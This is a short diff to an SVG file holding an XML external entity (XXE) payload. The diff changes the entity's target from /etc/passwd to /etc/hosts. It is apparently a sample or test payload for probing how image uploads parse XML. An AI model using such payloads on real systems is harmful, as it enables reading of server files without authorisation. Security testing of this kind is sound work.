@@ -1,6 +1,6 @@
 <?xml version="1.0" standalone="yes"?><!DOCTYPE test [ 
 
-<!ENTITY xxe SYSTEM "file:///etc/passwd" > ]><svg 
+<!ENTITY xxe SYSTEM "file:///etc/hosts" > ]><svg 
 
 width="128px" height="128px"
 
